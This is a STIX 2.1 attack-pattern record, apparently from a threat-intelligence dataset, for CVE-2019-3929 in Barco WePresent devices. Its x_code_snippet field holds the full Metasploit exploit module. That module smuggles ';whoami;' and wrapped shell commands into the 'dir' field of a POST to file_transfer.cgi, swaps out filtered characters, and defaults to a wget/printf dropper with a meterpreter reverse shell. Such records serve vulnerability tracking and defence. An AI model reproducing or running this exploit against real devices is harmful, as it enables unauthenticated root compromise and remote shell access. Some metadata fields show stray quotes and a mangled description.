{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--93344319-7979-40f3-8d6b-0c4d7796c3fa",
    "created": "2024-08-14T17:03:19.47714Z",
    "modified": "2024-08-14T17:03:19.477144Z",
    "name": "\"Barco WePresent file_transfer.cgi Command Injection\"",
    "description": "( This module exploits an unauthenticated remote command injection vulnerability found in Barco WePresent and related OEM'ed products. The vulnerability is triggered via an HTTP POST request to the file_transfer.cgi endpoint. ) 'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/wepresent_cmd_injection.rb",
            "external_id": "wepresent_cmd_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-3929"
        },
        {
            "source_name": "reference",
            "url": "https://medium.com/tenable-techblog/eight-devices-one-exploit-f5fc28c70a7c"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => \"Barco WePresent file_transfer.cgi Command Injection\",\n      'Description'    => %q(\n        This module exploits an unauthenticated remote command injection\n        vulnerability found in Barco WePresent and related OEM'ed products.\n        The vulnerability is triggered via an HTTP POST request to the\n        file_transfer.cgi endpoint.\n      ),\n      'License'        => MSF_LICENSE,\n      'Author'         => 'Jacob Baines', # @Junior_Baines'\n      'References'     =>\n        [\n          ['CVE', '2019-3929'],\n          ['EDB', '46786'],\n          ['URL', 'https://medium.com/tenable-techblog/eight-devices-one-exploit-f5fc28c70a7c']\n        ],\n      'DisclosureDate' => \"2019-04-30\",\n      'Platform'       => ['unix', 'linux'],\n      'Arch'           => [ARCH_CMD, ARCH_ARMLE],\n      'Privileged'     => false,\n      'Targets'        => [\n        ['Unix In-Memory',\n         'Platform'    => 'unix',\n         'Arch'        => ARCH_CMD,\n         'Type'        => :unix_memory,\n         'Payload'     => {\n           'Compat' => { 'PayloadType' => 'cmd', 'RequiredCmd' => 'telnetd' }\n         }],\n        ['Linux Dropper',\n         'Platform'        => 'linux',\n         'Arch'            => ARCH_ARMLE,\n         'CmdStagerFlavor' => ['printf', 'wget'],\n         'Type'            => :linux_dropper]\n      ],\n      'DefaultTarget'  => 1,\n      'DefaultOptions' => {\n        'SSL'               => true,\n        'RPORT'             => 443,\n        'CMDSTAGER::FLAVOR' => 'printf',\n        'PAYLOAD'           => 'linux/armle/meterpreter/reverse_tcp'\n      }))\n  end\n\n  def filter_bad_chars(cmd)\n    cmd.gsub!(/;/, 'Pa_Note')\n    cmd.gsub!(/\\+/, 'Pa_Add')\n    cmd.gsub!(/&/, 'Pa_Amp')\n    return cmd\n  end\n\n  def send_command(cmd, timeout)\n    vars_post = {\n      file_transfer: 'new',\n      dir: \"'#{filter_bad_chars(cmd)}'\"\n    }\n\n    send_request_cgi({\n      'uri'       => '/cgi-bin/file_transfer.cgi',\n      'method'    => 'POST',\n      'vars_post' => vars_post\n    }, timeout)\n  end\n\n  def check\n    check_resp = send_command(\";whoami;\", 5)\n    unless check_resp\n      return CheckCode::Unknown('Connection failed.')\n    end\n\n    if check_resp.code == 200\n      check_resp.body.gsub!(/[\\r\\n]/, \"\")\n      if check_resp.body == \"root\"\n        return CheckCode::Vulnerable\n      end\n    end\n\n    CheckCode::Safe\n  end\n\n  def execute_command(cmd, _opts = {})\n    send_command(\";(#{cmd})&\", nil)\n  end\n\n  def exploit\n    case target['Type']\n    when :unix_memory\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager(linemax: 128)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "\"2019-04-30\"",
    "x_mitre_platforms": [
        "linux'"
    ]
}